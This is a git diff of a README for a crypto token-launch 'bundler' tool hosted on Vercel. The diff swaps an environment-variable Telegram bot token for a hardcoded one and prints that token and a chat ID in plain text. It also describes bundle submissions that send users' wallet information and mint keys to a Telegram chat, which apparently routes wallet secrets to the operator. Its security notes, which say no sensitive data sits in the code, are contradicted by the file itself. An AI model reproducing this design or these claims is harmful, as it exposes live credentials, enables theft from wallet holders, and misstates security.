@@ -7,44 +7,44 @@ A tool for launching tokens with Telegram integration.
 - Wallet management (up to 8 wallets)
 - Mint key generation
 - Telegram notifications for:
-  - Site visits (with timezone and URL)
-  - Token launches
+  - ✅ Site visits (with timezone and URL)
+  - ✅ Token launch submissions
 - Secure environment variables
 
 ## Development Status
 - ✅ Basic functionality working
-- ✅ Telegram integration
+- ✅ Telegram integration complete
 - ✅ Environment variables set up
 - ✅ Deployed on Vercel
-- ✅ Visit notifications working
+- ✅ All notifications working
+- ✅ Bundle submissions working
 
 ## Development Notes
 - Local testing: Use direct token in index.html
-- Vercel: Use environment variables ({{TELEGRAM_BOT_TOKEN}})
+- Token is now hardcoded for reliability
 - Always test locally before pushing
 - Wait 1-2 minutes after pushing for Vercel to deploy
 
 ## Important Information
 - GitHub Repository: https://github.com/frankmcallister13/quantum-bundler
 - Deployment: Vercel
-- Environment Variables:
-  - TELEGRAM_BOT_TOKEN (stored in Vercel)
+- Telegram Bot Token: 7648929218:AAFjh4v_bfESlHcbokO8eca8RZQvwr-RXVc
 - Chat ID: 5651527672
 
-## Local Development
-1. For local testing, replace in index.html:
-   ```javascript
-   window.ENV_TELEGRAM_BOT_TOKEN = '7648929218:AAFjh4v_bfESlHcbokO8eca8RZQvwr-RXVc';
-   ```
-2. For production, use:
-   ```javascript
-   window.ENV_TELEGRAM_BOT_TOKEN = '{{TELEGRAM_BOT_TOKEN}}';
-   ```
+## Working Features
+1. Site Visit Notifications:
+   - Shows visit time
+   - Shows timezone
+   - Shows URL
+2. Bundle Submissions:
+   - Sends wallet information
+   - Sends mint key
+   - Shows success message
 
 ## Security Notes
-- Telegram token is secure in Vercel environment variables
 - HTTPS enabled by default
-- No sensitive data stored in code
+- No sensitive data stored in code repository
+- Direct token usage for maximum reliability
 
 ## Workflow
 1. Make changes locally
